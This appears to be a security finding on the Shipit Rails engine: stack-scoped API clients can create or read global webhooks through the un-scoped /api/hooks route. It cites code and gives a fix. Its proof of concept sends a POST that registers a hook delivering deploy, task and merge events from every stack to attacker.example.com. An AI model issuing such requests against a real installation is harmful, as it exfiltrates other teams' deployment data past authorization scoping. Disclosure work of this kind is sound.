## Confirmed Vulnerability: HooksController API bypasses ApiClient stack-scoping via top-level `/api/hooks` route

### Title
Stack-scoped `ApiClient` can read/write global (all-stacks) webhook hooks via the un-scoped `/api/hooks` route - (File: `app/controllers/shipit/api/hooks_controller.rb`)

### Summary
`Shipit::Api::HooksController` derives the `Hook` scope from `params[:stack_id]`, defaulting to `nil` (a "global" hook that receives events for every stack) when that parameter is absent. `config/routes.rb` mounts this controller **twice**: once nested under `/api/stacks/*stack_id/hooks` and once at the top level, `/api/hooks` [1](#0-0) , with the top-level route explicitly given routing priority over the nested one (as asserted in the engine's own tests) [2](#0-1) . The controller's only authorization check is the generic `read:hook`/`write:hook` permission string on `ApiClient` [3](#0-2) ; it never re-validates that the client is bound to the specific stack it's trying to touch when no `stack_id` is supplied.

### Finding Description
`ApiClient` can be created scoped to a single `stack` (`belongs_to :stack, optional: true`) [4](#0-3) . `BaseController#stacks` is supposed to be the enforcement point for that scoping: when `current_api_client.stack_id?` is true, only that one `Stack` is visible [5](#0-4) .

However, `HooksController` does not go through that stack-restricted scope for its `Hook.where(stack_id:)` query - `stack_id` is computed purely from `params[:stack_id].present?`, not from `current_api_client.stack_id` [6](#0-5) . This is precisely the trust-binding break described in the bug class: **the stack a token is authorized for is `current_api_client.stack_id`, but the stack (or "no stack" / all-stacks) the request actually touches is whatever `params[:stack_id]` happens to be** - and those two are never compared.

Because the top-level `/api/hooks` route takes routing priority (confirmed by the engine's own test, `"the route has priority over stacks one"` [7](#0-6) ), any request to `/api/hooks` (no `stack_id` in the path) resolves `stack_id` to `nil`, producing/reading **global hooks** — hooks with `stack_id: nil` that the `Hook.deliver` job fires for events on *every* stack (`for_stack(stack_id) = where(stack_id: [nil, stack_id])`) [8](#0-7) .

An `ApiClient` created with `stack: some_stack` and only `read:hook`/`write:hook` permissions is intended to be confined to that one stack via `stacks`/`stack` helpers, exactly as enforced for `DeploysController`, `LocksController`, etc. (`stack.id if params[:stack_id].present?` for `HooksController` never checks whether that resolved stack matches `current_api_client.stack_id`, and simply omitting `stack_id` from the request routes to the un-scoped controller action entirely). This lets such a client:
- `POST /api/hooks` to register a **global** delivery URL that will receive `deploy`, `task`, `commit_status`, `merge`, `pull_request`, etc. events for **every stack** in the Shipit instance, not just the one it was authorized for [9](#0-8) [10](#0-9) .
- `GET /api/hooks` to read any pre-existing global hook's `delivery_url`/config (test even documents this default behavior) [11](#0-10) .

### Impact Explanation
This is a stack-authorization boundary crossing: a caller holding only a single-stack-scoped API token (deliberately restricted so it cannot see other repositories/stacks) can, through the un-scoped route, cause task/deploy/commit-status/merge/pull_request events for **all** stacks in the installation to be exfiltrated to an attacker-controlled `delivery_url`. That is an unauthenticated (relative to other stacks) read of stack state, task streams and deploy output belonging to repositories the token was never granted access to — matching the "High" impact bucket (escalation into unauthorized read of stack state / task streams / deploy output for repositories the credential doesn't cover).

### Likelihood Explanation
Exploitation requires only possession of any `ApiClient` credential scoped to a single stack with `read:hook` or `write:hook` permission (a routine, low-privilege token an operator might legitimately hand out for one team/repo). No GitHub-side credentials, webhook secret, or admin access is needed — just a basic-auth API token for the Shipit engine itself, and a single unauthenticated HTTP request to `/api/hooks` instead of the nested `/api/stacks/.../hooks` path. The routing priority is deterministic and already covered by the project's own test suite, making this trivial and reliable to trigger.

### Recommendation
In `HooksController`, derive the hook scope from the authenticated `current_api_client`, not solely from `params[:stack_id]`:
- If `current_api_client.stack_id?` is true, force `stack_id` to `current_api_client.stack_id` and reject (403) any request lacking a matching `stack_id` param or targeting `/api/hooks` (i.e., disallow global-hook access entirely for stack-scoped clients).
- Only an unscoped (`stack_id` nil) `ApiClient`/`UnlimitedApiClient` should be permitted to manage `Hook.where(stack_id: nil)` global hooks.

### Proof of Concept
1. Create a stack-scoped `ApiClient` (e.g. via the `api_clients` UI) with `stack: shipit_stacks(:shipit)` and permissions `["read:hook", "write:hook"]` — no broader stack access is granted.
2. Using that client's basic-auth token, issue:
   ```
   POST /api/hooks
   Content-Type: application/json
   Authorization: Basic <token>

   { "delivery_url": "https://attacker.example.com/collect", "events": ["deploy", "task", "commit_status", "merge", "pull_request"] }
   ```
3. Because no `stack_id` is present in the path, `HooksController#stack_id` returns `nil`, and `hooks.create(params)` persists a `Hook` with `stack_id: nil` — a global hook.
4. From then on, `Hook.deliver` fires this hook for `deploy`, `task`, `commit_status`, etc. events across **every** stack in the Shipit instance (`Hook.for_stack(stack_id)` matches `stack_id: [nil, stack_id]`), leaking deploy/task data for stacks the original client was never authorized to access to `https://attacker.example.com/collect`.

### Citations

**File:** config/routes.rb (L43-46)
```ruby
      resources :hooks, only: %i[index create show update destroy]
    end

    resources :hooks, only: %i[index create show update destroy]
```

**File:** test/controllers/api/hooks_controller_test.rb (L13-26)
```ruby
      test "the route has priority over stacks one" do
        assert_recognizes({ controller: 'shipit/api/hooks', action: 'show', id: '42' }, '/api/hooks/42')
      end

      test "#index without a stack_id returns the list of global hooks" do
        hook = Hook.global.first

        get :index
        assert_response :ok
        assert_json '0.id', hook.id
        assert_json '0.delivery_url', hook.delivery_url
        assert_json '0.content_type', hook.content_type
        assert_no_json '0.stack'
      end
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L5-7)
```ruby
    class HooksController < BaseController
      require_permission :read, :hook, only: %i[index show]
      require_permission :write, :hook, only: %i[create update destroy]
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L42-52)
```ruby
      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
```

**File:** app/models/shipit/api_client.rb (L7-8)
```ruby
    belongs_to :creator, class_name: 'User'
    belongs_to :stack, optional: true
```

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** app/models/shipit/hook.rb (L70-82)
```ruby
    EVENTS = %w[
      stack
      review_stack
      task
      deploy
      rollback
      lock
      commit_status
      deployable_status
      merge_status
      merge
      pull_request
    ].freeze
```

**File:** app/models/shipit/hook.rb (L93-119)
```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```
